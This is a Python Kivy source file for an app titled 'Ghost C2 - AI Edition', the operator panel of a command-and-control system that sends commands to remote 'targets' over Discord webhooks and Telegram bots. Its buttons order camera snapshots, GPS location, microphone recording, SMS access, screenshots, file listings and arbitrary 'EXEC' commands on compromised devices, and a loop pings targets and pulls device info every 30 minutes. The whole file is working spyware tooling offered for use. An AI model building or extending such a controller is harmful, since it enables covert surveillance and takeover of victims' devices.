from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.storage.jsonstore import JsonStore
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
from kivy.core.window import Window
import requests
import threading
from datetime import datetime
import time
import random
import json

class GhostApp(App):
    def build(self):
        self.store = JsonStore('ghost_ai.json')
        self.title = "Ghost C2 - AI Edition"
        self.current_target_index = 0
        self.monitoring_active = False
        self.custom_buttons = []  # Store custom button commands
        
        # Load targets
        if self.store.exists('targets'):
            self.targets = self.store.get('targets')['list']
        else:
            self.targets = [{'name': 'Target1', 'webhook': '', 'tg_token': '', 'tg_chat': '', 
                             'last_seen': 0, 'status': 'unknown', 'device_info': {}}]
            self.store.put('targets', list=self.targets)
        
        # Load custom buttons
        if self.store.exists('custom_buttons'):
            self.custom_buttons = self.store.get('custom_buttons')['list']
        else:
            self.custom_buttons = []
            self.store.put('custom_buttons', list=self.custom_buttons)

        self.main_layout = BoxLayout(orientation='vertical', padding=8, spacing=6)
        with self.main_layout.canvas.before:
            Color(0.05, 0.05, 0.1, 1)
            self.rect = Rectangle(size=Window.size, pos=(0,0))
        Window.bind(on_resize=self._update_rect)
        
        self._build_ui()
        self.start_ai_monitor()
        return self.main_layout

    def _update_rect(self, *args):
        self.rect.size = Window.size

    def _build_ui(self):
        # Top bar
        top = BoxLayout(size_hint_y=None, height=45, spacing=5)
        self.target_btn = Button(text=f"Target: {self.targets[0]['name']}", background_color=(0.1,0.2,0.4,1))
        self.target_btn.bind(on_press=self.cycle_target)
        add_btn = Button(text="+", size_hint_x=None, width=45, background_color=(0,0.5,0,1))
        add_btn.bind(on_press=self.add_target_popup)
        test_btn = Button(text="Test", size_hint_x=None, width=45, background_color=(0.2,0.5,0.8,1))
        test_btn.bind(on_press=self.test_channels)
        monitor_btn = Button(text="AI", size_hint_x=None, width=45, background_color=(0.6,0.4,0,1))
        monitor_btn.bind(on_press=self.toggle_monitor)
        clear_btn = Button(text="Clear", size_hint_x=None, width=50, background_color=(0.7,0.2,0.2,1))
        clear_btn.bind(on_press=lambda x: self.log_view.clear_widgets())
        top.add_widget(self.target_btn)
        top.add_widget(add_btn)
        top.add_widget(test_btn)
        top.add_widget(monitor_btn)
        top.add_widget(clear_btn)
        self.main_layout.add_widget(top)

        # Input fields
        self.in_webhook = TextInput(hint_text="Discord Webhook", password=True, size_hint_y=None, height=38)
        self.in_token = TextInput(hint_text="Telegram Token", password=True, size_hint_y=None, height=38)
        self.in_chat = TextInput(hint_text="Telegram Chat ID", size_hint_y=None, height=38)
        t = self.targets[self.current_target_index]
        self.in_webhook.text = t.get('webhook', '')
        self.in_token.text = t.get('tg_token', '')
        self.in_chat.text = t.get('tg_chat', '')
        for w in [self.in_webhook, self.in_token, self.in_chat]:
            w.bind(text=self.sync_target)
            self.main_layout.add_widget(w)

        # AI Status label
        self.ai_status = Label(text="AI Monitor: OFF", size_hint_y=None, height=25, color=(0.7,0.7,0.7,1))
        self.main_layout.add_widget(self.ai_status)

        # Dynamic buttons section
        dyn_label = Label(text="--- Custom Commands ---", size_hint_y=None, height=25, color=(0.5,0.8,0.5,1))
        self.main_layout.add_widget(dyn_label)
        
        self.dyn_grid = GridLayout(cols=3, spacing=5, size_hint_y=None)
        self.dyn_grid.bind(minimum_height=self.dyn_grid.setter('height'))
        self.main_layout.add_widget(self.dyn_grid)
        self.refresh_dynamic_buttons()

        # Add custom button button
        add_custom_btn = Button(text="+ Add Custom Command", size_hint_y=None, height=40, background_color=(0.2,0.4,0.6,1))
        add_custom_btn.bind(on_press=self.add_custom_command_popup)
        self.main_layout.add_widget(add_custom_btn)

        # Fixed command buttons
        fixed_label = Label(text="--- Fixed Commands ---", size_hint_y=None, height=25, color=(0.5,0.8,0.5,1))
        self.main_layout.add_widget(fixed_label)
        
        grid = GridLayout(cols=3, spacing=5, size_hint_y=None, height=110)
        for name, code in [("CAM", "SNAP"), ("GPS", "LOC"), ("MIC", "REC"),
                           ("SMS", "MSG"), ("SCREEN", "SS"), ("FILE", "LS"),
                           ("GET STATUS", "GET_STATUS"), ("DEVICE INFO", "GET_INFO")]:
            btn = Button(text=name, font_size='11sp', background_color=(0.1,0.3,0.3,1))
            btn.bind(on_press=lambda x, c=code: self.dispatch(c))
            grid.add_widget(btn)
        self.main_layout.add_widget(grid)

        # Log area
        self.log_view = GridLayout(cols=1, size_hint_y=None, spacing=2)
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll = ScrollView()
        scroll.add_widget(self.log_view)
        self.main_layout.add_widget(scroll)

    # ========== Dynamic Buttons ==========
    def refresh_dynamic_buttons(self):
        self.dyn_grid.clear_widgets()
        for btn_data in self.custom_buttons:
            btn = Button(text=btn_data['name'], font_size='11sp', background_color=(0.2,0.4,0.5,1))
            btn.bind(on_press=lambda x, cmd=btn_data['command']: self.dispatch(cmd))
            self.dyn_grid.add_widget(btn)
        # Adjust height
        rows = (len(self.custom_buttons) + 2) // 3
        self.dyn_grid.height = max(40, rows * 45)

    def add_custom_command_popup(self, instance):
        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
        name_input = TextInput(hint_text="Button Name", multiline=False)
        cmd_input = TextInput(hint_text="Command to send (e.g., EXEC:ls)", multiline=False)
        btn = Button(text="Add", background_color=(0,0.6,0.3,1))
        content.add_widget(name_input)
        content.add_widget(cmd_input)
        content.add_widget(btn)
        popup = Popup(title="New Custom Command", content=content, size_hint=(0.8,0.4))
        btn.bind(on_press=lambda x: self._add_custom_button(name_input.text, cmd_input.text, popup))
        popup.open()

    def _add_custom_button(self, name, cmd, popup):
        if name.strip() and cmd.strip():
            self.custom_buttons.append({'name': name.strip(), 'command': cmd.strip()})
            self.store.put('custom_buttons', list=self.custom_buttons)
            self.refresh_dynamic_buttons()
            self.add_log(f"Added custom button: {name}")
            popup.dismiss()
        else:
            self.add_log("Name and command required!", True)

    # ========== Target Management ==========
    def cycle_target(self, *args):
        self.current_target_index = (self.current_target_index + 1) % len(self.targets)
        t = self.targets[self.current_target_index]
        self.in_webhook.text = t.get('webhook', '')
        self.in_token.text = t.get('tg_token', '')
        self.in_chat.text = t.get('tg_chat', '')
        self.target_btn.text = f"Target: {t['name']}"
        self.add_log(f"Switched to {t['name']}")

    def sync_target(self, *args):
        t = self.targets[self.current_target_index]
        t['webhook'] = self.in_webhook.text
        t['tg_token'] = self.in_token.text
        t['tg_chat'] = self.in_chat.text
        self.store.put('targets', list=self.targets)

    def add_target_popup(self, instance):
        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
        name_input = TextInput(hint_text="Target Name", multiline=False)
        btn = Button(text="Add", background_color=(0,0.6,0.3,1))
        content.add_widget(name_input)
        content.add_widget(btn)
        popup = Popup(title="New Target", content=content, size_hint=(0.7,0.3))
        btn.bind(on_press=lambda x: self._add_target(name_input.text, popup))
        popup.open()

    def _add_target(self, name, popup):
        if name.strip():
            self.targets.append({'name': name, 'webhook': '', 'tg_token': '', 'tg_chat': '', 
                                 'last_seen': 0, 'status': 'unknown', 'device_info': {}})
            self.store.put('targets', list=self.targets)
            self.add_log(f"Target '{name}' added")
            popup.dismiss()
        else:
            self.add_log("Name required!", True)

    # ========== AI Monitor ==========
    def start_ai_monitor(self):
        if self.monitoring_active:
            return
        self.monitoring_active = True
        self.ai_status.text = "AI Monitor: ACTIVE (checking every 30 min)"
        threading.Thread(target=self._ai_loop, daemon=True).start()

    def stop_ai_monitor(self):
        self.monitoring_active = False
        self.ai_status.text = "AI Monitor: OFF"

    def toggle_monitor(self, instance):
        if self.monitoring_active:
            self.stop_ai_monitor()
        else:
            self.start_ai_monitor()

    def _ai_loop(self):
        while self.monitoring_active:
            time.sleep(1800)  # 30 minutes
            self._ai_check_all_targets()

    def _ai_check_all_targets(self):
        for idx, target in enumerate(self.targets):
            # Use Telegram or Discord to send PING
            token = target.get('tg_token', '')
            chat = target.get('tg_chat', '')
            webhook = target.get('webhook', '')
            if token and chat:
                try:
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    r = requests.post(url, json={"chat_id": chat, "text": "PING"}, timeout=10)
                    if r.status_code == 200:
                        target['last_seen'] = int(time.time())
                        target['status'] = 'online'
                        # Also request device info periodically
                        self._request_device_info(target)
                    else:
                        target['status'] = 'offline'
                except:
                    target['status'] = 'offline'
            elif webhook:
                try:
                    r = requests.post(webhook, json={"content": "PING"}, timeout=10)
                    if r.status_code < 300:
                        target['last_seen'] = int(time.time())
                        target['status'] = 'online'
                    else:
                        target['status'] = 'offline'
                except:
                    target['status'] = 'offline'
            else:
                target['status'] = 'no_channel'
            
            # Update store
            self.store.put('targets', list=self.targets)
            
            # Send alert if target went offline unexpectedly
            if target['status'] == 'offline' and target.get('last_seen', 0) > 0:
                Clock.schedule_once(lambda dt, t=target: self.add_log(f"ALERT: Target {t['name']} went offline!", True))

    def _request_device_info(self, target):
        # Send GET_INFO command to target (asynchronously)
        token = target.get('tg_token', '')
        chat = target.get('tg_chat', '')
        if token and chat:
            try:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                requests.post(url, json={"chat_id": chat, "text": "CMD:GET_INFO"}, timeout=5)
            except: pass

    def update_device_info(self, target_name, info):
        for t in self.targets:
            if t['name'] == target_name:
                t['device_info'] = info
                self.store.put('targets', list=self.targets)
                break

    # ========== Test Channels ==========
    def test_channels(self, instance):
        def _test():
            ds_ok = False
            if self.in_webhook.text:
                try:
                    r = requests.post(self.in_webhook.text, json={"content": "PING"}, timeout=5)
                    ds_ok = r.status_code < 300
                except: pass
            tg_ok = False
            if self.in_token.text and self.in_chat.text:
                try:
                    url = f"https://api.telegram.org/bot{self.in_token.text}/sendMessage"
                    r = requests.post(url, json={"chat_id": self.in_chat.text, "text": "PING"}, timeout=5)
                    tg_ok = r.status_code == 200
                except: pass
            Clock.schedule_once(lambda dt: self.add_log(f"Discord: {'OK' if ds_ok else 'FAIL'} | Telegram: {'OK' if tg_ok else 'FAIL'}"))
        threading.Thread(target=_test).start()

    # ========== Send Command ==========
    def dispatch(self, cmd):
        if not cmd.strip():
            return
        has_discord = bool(self.in_webhook.text.strip())
        has_telegram = bool(self.in_token.text.strip() and self.in_chat.text.strip())
        if not (has_discord or has_telegram):
            self.add_log("No active channel!", True)
            return

        cmd_id = str(random.randint(1000, 9999))
        self.add_log_entry(cmd, cmd_id)
        final_msg = f"CMD:{cmd_id}|{cmd}"

        def send_proc():
            success = False
            if has_discord:
                try:
                    requests.post(self.in_webhook.text, json={"content": final_msg}, timeout=8)
                    success = True
                except: pass
            if has_telegram:
                try:
                    url = f"https://api.telegram.org/bot{self.in_token.text}/sendMessage"
                    requests.post(url, json={"chat_id": self.in_chat.text, "text": final_msg}, timeout=8)
                    success = True
                except: pass
            if success:
                Clock.schedule_once(lambda dt: self.add_log(f"Sent: {cmd} (ID:{cmd_id})"))
                # Update last_seen for this target
                t = self.targets[self.current_target_index]
                t['last_seen'] = int(time.time())
                t['status'] = 'online'
                self.store.put('targets', list=self.targets)
            else:
                Clock.schedule_once(lambda dt: self.add_log(f"Failed: {cmd}", True))
        threading.Thread(target=send_proc).start()

    def add_log_entry(self, cmd, cmd_id):
        lbl = Label(text=f"[{datetime.now().strftime('%H:%M:%S')}] Sending: {cmd} (ID:{cmd_id})",
                    size_hint_y=None, height=22, font_size='11sp', color=(0.7,0.7,0.7,1))
        self.log_view.add_widget(lbl, index=0)

    def add_log(self, msg, is_error=False):
        if len(self.log_view.children) > 30:
            self.log_view.remove_widget(self.log_view.children[-1])
        color = (1,0.4,0.4,1) if is_error else (0.4,1,0.6,1)
        lbl = Label(text=f"[{datetime.now().strftime('%H:%M:%S')}] {msg}",
                    size_hint_y=None, height=22, font_size='11sp', color=color)
        self.log_view.add_widget(lbl, index=0)

if __name__ == '__main__':
    GhostApp().run()
